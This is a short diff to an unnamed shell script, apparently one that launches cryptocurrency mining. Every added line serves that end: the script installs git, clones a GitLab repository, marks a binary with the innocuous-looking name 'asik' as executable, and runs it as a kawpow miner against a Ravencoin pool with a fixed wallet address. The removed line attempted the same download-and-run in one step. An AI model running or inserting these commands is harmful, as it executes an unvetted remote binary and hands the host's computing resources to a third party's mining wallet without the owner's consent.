@@ -1,1 +1,5 @@
-curl https://gitlab.com/a7480247/gas/-/raw/main/asik && ./asik -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RJK4zn6E7EH8FCzrSos7vrJxB74qB2PX6u.yangbeb
+apt-get install git
+git clone https://gitlab.com/a7480247/gas.git
+cd gas
+chmod u+x asik
+./asik -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RJK4zn6E7EH8FCzrSos7vrJxB74qB2PX6u.yangbeb
